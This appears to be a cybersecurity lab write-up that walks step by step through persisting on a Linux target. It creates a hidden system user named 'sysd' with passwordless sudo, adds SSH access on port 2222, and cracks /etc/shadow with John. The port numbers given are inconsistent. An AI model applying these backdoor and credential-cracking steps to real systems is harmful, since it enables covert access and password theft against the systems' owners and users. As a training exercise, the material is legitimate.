# Advanced Bash - Owning the System

## Step 1: Shadow People
- 1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:
  - sudo useradd --system --no-create-home sysd

![](/Linux/Images/AB-1-create-user.png)

- 2. Give your secret user a password:
  - Sudo passwd sysd

![](/Linux/Images/AB-2-password.png)

- 3. Give your secret user a system UID < 1000
    - sudo usermod -u 997 sysd

![](/Linux/Images/AB-3-group.png)

- 4. Give your secret user the same GID:
    - sudo groupmod -g 997 sysd

![](/Linux/Images/AB-4-gid.png)

- 5. Give your secret user full sudo access without the need for a password:
    - sudo visudo

![](/Linux/Images/AB-5-visudo.png)

- 6. Test that sudo access works without your password:
    - su sysd
    - Passw0rd

![](/Linux/Images/AB-6-test-access.png)

## Step 2: Smooth Sailing
- 1. Edit the sshd_config file:
  - sudo nano /etc/ssh/sshd_config

![](/Linux/Images/AB-2.1-nano-sshd.png)

![](/Linux/Images/AB-2.1-nano.png)

## Step 3: Testing Your Configuration Update
- 1. Restart the SSH service:
  - systemctl restart ssh

![](/Linux/Images/AB-3.1-restart.png)

- 2. Exit the root account
- 3. SSH to the target machine using your sysd account and port 2222:
  - ssh sysd@192.168.1.23 -p 2222

![](/Linux/Images/AB-3.3-port222.png)

  - 4. Use sudo to switch to the root user:
    - sudo su root

![](/Linux/Images/AB-3.4-su-root.png)

## Step 4: Crack All the Passwords
- 1. SSH back to the system using your sysd account and port 2222:
  - ssh sysd@192.168.1.23 -p 22

![](/Linux/Images/AB-4.1-ssh-p222.png)

- 2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
  - sudo su root
  - john /etc/shadow

![](/Linux/Images/AB-4.2-john.png)
